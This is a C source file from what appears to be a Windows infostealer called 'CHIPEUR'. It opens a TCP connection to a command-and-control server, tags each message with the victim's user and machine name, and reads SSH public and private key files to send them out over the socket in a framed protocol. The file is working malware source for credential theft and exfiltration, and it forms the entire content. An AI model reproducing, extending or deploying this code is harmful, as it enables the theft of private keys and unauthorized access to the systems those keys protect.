#include "c2.h"

#include <winsock2.h>
#include <lmcons.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winbase.h>
#include <windows.h>

#include "find_ssh_key.h"
#include "obfuscation.h"
#include "extract_file.h"

BOOL connect_to_c2(SOCKET *sock) {
  // Create the socket and establish the connection to the C2 server.

  int err;
  // loading winsocket.dll
  WSADATA wsaData = {0};
  err = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (err != 0) {
    printf(
        "DEBUG: connect_to_c2: Error while loading winsocker.dll: Error %d\n",
        err);
    return FALSE;
  }

  // Creating the socket
  *sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (*sock == INVALID_SOCKET) {
    err = WSAGetLastError();
    printf("DEBUG: connect_to_c2: Error while creating the socket: Error %d\n",
           err);
    return FALSE;
  }

  // Creating the client
  SOCKADDR_IN client;
  client.sin_family = AF_INET;
  client.sin_addr.S_un.S_addr = inet_addr(C2_IP);
  client.sin_port = htons(C2_PORT);

  // connecting to the c2 server
  err = connect(*sock, (SOCKADDR *)&client, sizeof(client));
  if (err == SOCKET_ERROR) {
    printf("DEBUG: connect_to_c2: Error while creating the client: Error %d\n",
           WSAGetLastError());
    return FALSE;
  }
  printf("INFO: connect_to_c2: Successfully connected to the c2 server\n");
  return TRUE;
}

static BOOL close_c2_conn(SOCKET *sock) {
  // closing the server
  int err = closesocket(*sock);
  if (err == SOCKET_ERROR) {
    printf(
        "DEBUG: close_c2_conn: Error while closing the connection: Error %d\n",
        WSAGetLastError());
    return FALSE;
  }
  return TRUE;
}

static PWSTR get_header(void) {
  // [CHIPEUR] + 'username@machinename' is the header of a message to the C2

  int err;
  WCHAR machineName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
  DWORD lenMachineName = MAX_COMPUTERNAME_LENGTH + 1;
  WCHAR userName[UNLEN + 1] = {0};
  DWORD lenUserName = UNLEN + 1;
  WCHAR fullName[UNLEN + MAX_COMPUTERNAME_LENGTH + 1 + 12] = {0};
  DWORD lenFullName = UNLEN + MAX_COMPUTERNAME_LENGTH + 1 + 12;

  err = GetComputerNameW(machineName, &lenMachineName);
  if (err == 0) {
    printf("DEBUG: get_header: Error while getting the machine name. %d\n",
           GetLastError());
  }
  err = GetUserNameW(userName, &lenUserName);
  if (err == 0) {
    printf("DEBUG: get_header: Error while getting the username. %d\n",
           GetLastError());
  }

  int realSize = _snwprintf(fullName, lenFullName, L"[CHIPEUR]|%ls@%ls|",
                            userName, machineName);
  if (realSize == -1) {
    fprintf(stderr,
            "DEBUG: get_header: Error while creating the header username\n");
    return NULL;
  }

  PWSTR header = _wcsdup(fullName);
  if (header == NULL) {
    fprintf(stderr,
            "DEBUG: get_header: Error while allocating the header username\n");
  }

  return header;
}

static BOOL send_file(const PWSTR filename, SOCKET *sock) {
  // Open the designated file and sent it to the c2 server via the socket sock
  HANDLE hFile;
  DWORD bytesRead;
  char buffer[1024];  // Size of the buffer
  BOOL result;

  // Open the file in reading mode
  hFile = CreateFileW(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  if (hFile == INVALID_HANDLE_VALUE) {
    wprintf(L"DEBUG: send_file: Error, couldn't open %ls file.\n", filename);
    return FALSE;
  }
  wprintf(L"DEBUG: send_file: Opening '%ls' file.\n", filename);
  // reading 1024 bytes block
  do {
    result = ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
    if (!result || bytesRead == 0) {
      break;
    }

    int err = send(*sock, buffer, bytesRead, 0);
    if (err == SOCKET_ERROR){
        fwprintf(stderr, L"DEBUG: send_file: Error, couldn't send a part of the file %ls: %d\n", filename, GetLastError());
        return FALSE;
    }

  } while (bytesRead > 0);

  CloseHandle(hFile);
  return TRUE;
}

BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
                  SOCKET *sock) {
  /*
  Try to send all the ssh key files. If all the files are sent successfully, it
  returns TRUE. Otherwise, it returns FALSE. The sent format for ssh key file is
  the following :
  [CHIPEUR]|<username>@<machinename>|file|<filenamePath>|<fileContent...>|[RUEPIHC]
  */
  PWSTR header = get_header();
  PWSTR datatype = L"file|";

  PWSTR headTypeFname;
  size_t lenHeadTypeFname = 0;
  BOOL success = TRUE;
  for (DWORD32 i = 0; i < lenKeysTab; i++) {
    // Checking first if the file is readable
    if (is_readable(keysTab[i].publicKeyPath)){        
        // Creating the full header with the datatype and the public key filename
        lenHeadTypeFname = wcslen(header) + wcslen(keysTab[i].publicKeyPath) + 6;
        headTypeFname = malloc(sizeof(WCHAR) * (lenHeadTypeFname + 1));
        if (headTypeFname == NULL) {
            fwprintf(stderr, L"DEBUG: send_ssh_key: Error, couldn't allocate the full header\n");
            free(header);
            return FALSE;
        }

        headTypeFname[lenHeadTypeFname] = L'\0';
        _snwprintf(headTypeFname, lenHeadTypeFname, L"%ls%ls%ls|", header, datatype, keysTab[i].publicKeyPath);
        int err = send(*sock, (char *)headTypeFname, sizeof(WCHAR) * lenHeadTypeFname, 0);
        wprintf(L"headtypefname = %ls\n", headTypeFname);
        if (err == SOCKET_ERROR) {
            fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send header: %d\n", GetLastError());
            free(headTypeFname);
            free(header);
            return FALSE;
        }
        if (send_file(keysTab[i].publicKeyPath, sock) == FALSE) {
            fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send file '%ls'\n", keysTab[i].publicKeyPath);
            success = FALSE;
        }
        err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 10, 0);
        if (err == SOCKET_ERROR) {
            fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send end of request: %d\n", GetLastError());
            free(headTypeFname);
            free(header);
            return FALSE;
        }
        wprintf(L"DEBUG: send_ssh_keys: File '%ls' sent with success\n", keysTab[i].publicKeyPath);
        free(headTypeFname);
    }
    // Doing the same but for the secret key filename
    if (is_readable(keysTab[i].secretKeyPath)){
        lenHeadTypeFname = wcslen(header) + wcslen(keysTab[i].secretKeyPath) + 6;
        headTypeFname = malloc(sizeof(WCHAR) * (lenHeadTypeFname + 1));
        if (headTypeFname == NULL) {
            fwprintf(stderr, L"DEBUG: send_ssh_key: Error, couldn't allocate the full header\n");
            free(header);
            return FALSE;
        }

        headTypeFname[lenHeadTypeFname] = L'\0';
        _snwprintf(headTypeFname, lenHeadTypeFname, L"%ls%ls%ls|", header, datatype, keysTab[i].secretKeyPath);
        wprintf(L"headtypefname = %ls\n", headTypeFname);
        int err = send(*sock, (char *)headTypeFname, sizeof(WCHAR) * lenHeadTypeFname, 0);
        if (err == SOCKET_ERROR) {
            fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send header: %d\n", GetLastError());
            free(headTypeFname);
            free(header);
            return FALSE;
        }
        if (send_file(keysTab[i].secretKeyPath, sock) == FALSE) {
            fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send file '%ls'\n", keysTab[i].secretKeyPath);
            success = FALSE;
        }
        err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 10, 0);
        if (err == SOCKET_ERROR) {
            fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send end of request: %d\n", GetLastError());
            free(headTypeFname);
            free(header);
            return FALSE;
        }
        wprintf(L"DEBUG: send_ssh_keys: File '%ls' sent with success\n", keysTab[i].secretKeyPath);
        free(headTypeFname);
    }
  }

  free(header);
  return success;
}